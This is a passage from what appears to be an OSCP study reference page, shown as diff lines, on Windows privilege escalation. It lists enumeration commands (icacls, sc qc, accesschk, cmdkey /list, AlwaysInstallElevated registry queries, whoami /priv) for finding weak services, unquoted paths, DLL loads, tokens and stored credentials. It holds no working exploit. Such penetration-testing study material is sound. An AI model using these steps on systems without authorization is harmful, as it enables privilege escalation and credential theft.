+<summary>Find: Prove effective file, registry and service-object permissions</summary>
+<p>Take a real service/task/application path from inventory, then inspect its file, parent and separate service-object permissions.</p>
+<pre><code class="language-cmd">icacls "C:\Path\To\OBJECT"
+icacls "C:\Path\To"
+sc.exe sdshow SERVICE
+</code></pre>
+<blockquote>
+<p><strong>Recognize:</strong> A modifiable parent can differ from a read-only file; service configuration rights are another control plane.</p>
+</blockquote>
+<blockquote>
+<p><strong>Validate next:</strong> Use icacls/Get-Acl on the reported object and parents. For a service also inspect sc qc/sc sdshow; for a task inspect its action/principal. Check the specific write/replace/configuration operation and its trigger.</p>
+</blockquote>
+<p><a href="/oscp/notes/methods/windows-privesc/#windows-acl">Prove effective file, registry and service-object permissions</a>.</p>
+</details>
+<details>
+<summary>Find: Recover Windows application, history and stored-credential artifacts</summary>
+<p>Follow actual application/configuration paths, PSReadLine history and saved-credential targets under the current readable user context.</p>
+<pre><code class="language-cmd">cmdkey /list
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
+</code></pre>
+<blockquote>
+<p><strong>Recognize:</strong> A target-bound saved credential is a possible consumer capability, not a plaintext password.</p>
+</blockquote>
+<blockquote>
+<p><strong>Validate next:</strong> Establish protecting user/context, intended logon type and an actually permitted saved-credential or decryption route.</p>
+</blockquote>
+<p><a href="/oscp/notes/methods/windows-privesc/#windows-secrets">Recover Windows application, history and stored-credential artifacts</a>.</p>
+</details>
+<details>
+<summary>Find: Change a privileged service's executable configuration</summary>
+<p>Inventory service accounts/paths, select a higher-identity service and query its effective service-object rights with the current token.</p>
+<pre><code class="language-powershell">Get-CimInstance Win32_Service | Select-Object Name,StartName,State,PathName
+sc.exe qc SERVICE
+accesschk.exe -accepteula -nobanner -v -w -c "USER" SERVICE
+</code></pre>
+<blockquote>
+<p><strong>Recognize:</strong> Configuration-change and start rights on the same higher-identity service are promising; file ACLs alone would not prove them.</p>
+</blockquote>
+<blockquote>
+<p><strong>Validate next:</strong> Use sc qc to read the service account and command, sc sdshow/AccessChk to verify configuration rights and sc query to inspect state. Confirm an allowed start/restart trigger before changing the service, then verify whoami.</p>
+</blockquote>
+<p><a href="/oscp/notes/methods/windows-privesc/#windows-service-config">Change a privileged service's executable configuration</a>.</p>
+</details>
+<details>
+<summary>Find: Replace a privileged service binary or consumed file</summary>
+<p>From service inventory follow the exact executable/script path and inspect both its own ACL and its parent's replacement rights.</p>
+<pre><code class="language-cmd">sc.exe qc SERVICE
+icacls "C:\Path\To\service.exe"
+icacls "C:\Path\To"
+</code></pre>
+<blockquote>
+<p><strong>Recognize:</strong> A higher-identity service consumes a potentially replaceable file in a modifiable directory.</p>
+</blockquote>
+<blockquote>
+<p><strong>Validate next:</strong> Use sc qc to locate the real binary and account, then icacls on that file and its parent. Confirm replacement rights and an available privileged service start/restart; a writable unrelated file is insufficient.</p>
+</blockquote>
+<p><a href="/oscp/notes/methods/windows-privesc/#windows-service-binary">Replace a privileged service binary or consumed file</a>.</p>
+</details>
+<details>
+<summary>Find: Exploit an unquoted service path with a writable earlier prefix</summary>
+<p>List service command lines and accounts, then inspect every earlier executable prefix in the actual unquoted path.</p>
+<pre><code class="language-powershell">Get-CimInstance Win32_Service | Select-Object Name,StartName,State,PathName
+</code></pre>
+<blockquote>
+<p><strong>Recognize:</strong> Spaces plus absent executable quoting create candidate earlier prefixes; writable placement and trigger remain unproved.</p>
+</blockquote>
+<blockquote>
+<p><strong>Validate next:</strong> Read the unquoted service command with sc qc. Check each earlier executable prefix for write/create access with icacls; confirm the service account and restart trigger. Spaces alone do not make the path exploitable.</p>
+</blockquote>
+<p><a href="/oscp/notes/methods/windows-privesc/#windows-unquoted">Exploit an unquoted service path with a writable earlier prefix</a>.</p>
+</details>
+<details>
+<summary>Find: Control a privileged DLL, helper or configuration load</summary>
+<p>Investigate a privileged application with observed dependency failures; if permitted, filter its runtime file loads in Procmon before checking candidate directory ACLs.</p>
+<pre><code class="language-text">Procmon, when accessible: filter the actual process; inspect requested .dll paths and NAME NOT FOUND results.
+Record the exact requested filename and every searched location.
+Then inspect the selected location's effective ACL with the owning procedure.
+</code></pre>
+<blockquote>
+<p><strong>Recognize:</strong> An actual requested missing dependency is stronger than guessing a DLL name, but does not prove an attacker-controlled resolution wins.</p>
+</blockquote>
+<blockquote>
+<p><strong>Validate next:</strong> Validate real privilege, search precedence/KnownDLLs/manifests, directory control, ABI/exports and a load trigger.</p>
+</blockquote>
+<p><a href="/oscp/notes/methods/windows-privesc/#windows-dll">Control a privileged DLL, helper or configuration load</a>.</p>
+</details>
+<details>
+<summary>Find: Control scheduled tasks, startup files or autostart consumers</summary>
+<p>Enumerate task definitions and inspect the action, principal, arguments and working directory before permission-checking its files.</p>
+<pre><code class="language-cmd">schtasks /query /fo LIST /v
+schtasks /query /tn "\FOLDER\TASK" /xml
+</code></pre>
+<blockquote>
+<p><strong>Recognize:</strong> A named privileged task exposes a concrete consumer and action path to investigate.</p>
+</blockquote>
+<blockquote>
+<p><strong>Validate next:</strong> Read the task's exact action, principal and trigger with schtasks or Get-ScheduledTask. Check icacls on its file/parents and prove the stronger identity will consume the controlled path at a reachable trigger.</p>
+</blockquote>
+<p><a href="/oscp/notes/methods/windows-privesc/#windows-tasks">Control scheduled tasks, startup files or autostart consumers</a>.</p>
+</details>
+<details>
+<summary>Find: Validate elevated installer policy and administrative-token context</summary>
+<p>Inspect both machine/user installer-policy values and the current token before inferring an elevated MSI or UAC-context route.</p>
+<pre><code class="language-cmd">reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+whoami /all
+</code></pre>
+<blockquote>
+<p><strong>Recognize:</strong> One policy value is insufficient; the two-policy conjunction is the key recognition condition.</p>
+</blockquote>
+<blockquote>
+<p><strong>Validate next:</strong> For installer execution verify both applicable values and permitted MSI/runtime; assess UAC administrator/token prerequisites separately.</p>
+</blockquote>
+<p><a href="/oscp/notes/methods/windows-privesc/#windows-installer">Validate elevated installer policy and administrative-token context</a>.</p>
+</details>
+<details>
+<summary>Find: Select a privilege-backed impersonation or object-control route</summary>
+<p>Inspect the current token's privileges, then map a relevant privilege to an actual protected operation and available source/trigger.</p>
+<pre><code class="language-cmd">whoami /priv
+whoami /all
+</code></pre>
+<blockquote>
+<p><strong>Recognize:</strong> An impersonation capability is present; the privileged authentication source required by a specific tool is not established.</p>
+</blockquote>
+<blockquote>
+<p><strong>Validate next:</strong> Read whoami /priv and whoami /all. Match the exact privilege, enabled state and token context to the technique's required API/trigger, then verify the resulting identity; the privilege name alone is not SYSTEM.</p>
+</blockquote>
+<p><a href="/oscp/notes/methods/windows-privesc/#windows-token">Select a privilege-backed impersonation or object-control route</a>.</p>
+</details>
+<details>
+<summary>Find: Use backup privilege to obtain protected local credential material</summary>
+<p>Inspect the actual token for backup-related rights and distinguish a privilege-aware read API from an ordinary file copy.</p>
+<pre><code class="language-cmd">whoami /priv
+</code></pre>
+<blockquote>
+<p><strong>Recognize:</strong> The privilege is assigned but initially disabled; permitted software may enable it for backup-semantic reads.</p>
+</blockquote>
+<blockquote>
+<p><strong>Validate next:</strong> Check that the privilege can actually be used, supporting API/context, complete matched source set and writable output.</p>
+</blockquote>
+<p><a href="/oscp/notes/methods/windows-privesc/#windows-backup">Use backup privilege to obtain protected local credential material</a>.</p>
+</details>
+<details>
+<summary>Find: Select a matching application, driver or kernel exploit</summary>
+<p>Collect OS build/patch and relevant installed driver/application versions before comparing any local-exploit requirement.</p>
+<pre><code class="language-powershell">Get-ComputerInfo | Select-Object OsBuildNumber,OsArchitecture
+Get-HotFix
+Get-CimInstance Win32_SystemDriver | Select-Object Name,State,PathName
+</code></pre>
+<blockquote>
+<p><strong>Recognize:</strong> The exact component/build is the candidate evidence; an OS-family name or one missing KB is insufficient.</p>
+</blockquote>
+<blockquote>
+<p><strong>Validate next:</strong> Verify vendor patch state, required driver/service/feature, architecture and PoC assumptions.</p>
+</blockquote>
+<p><a href="/oscp/notes/methods/windows-privesc/#windows-kernel">Select a matching application, driver or kernel exploit</a>.</p>
+</details>
+<details>
+<summary>Find: Turn automated Windows findings into manually verified candidates</summary>
+<p>Select a reviewed tool after checking host/runtime; treat each highlighted service, token or path as a lead to native evidence.</p>
+<pre><code class="language-powershell">whoami /all
+$PSVersionTable
+$ExecutionContext.SessionState.LanguageMode
+</code></pre>
+<blockquote>
+<p><strong>Recognize:</strong> The enumerator located a configuration clue, not the full usable chain.</p>
+</blockquote>
+<blockquote>
+<p><strong>Validate next:</strong> Run winPEAS with log output, then inspect the exact reported service with sc qc/sc sdshow and its file with icacls. Check token highlights with whoami /priv. A collector's colored line is not the resulting elevated token.</p>
+</blockquote>
+<p><a href="/oscp/notes/methods/windows-privesc/#windows-enumerators">Turn automated Windows findings into manually verified candidates</a>.</p>
+</details></article><hr><p><a href="#document">Top of document</a> · <a href="/oscp/">Reference home</a></p></main></body></html>
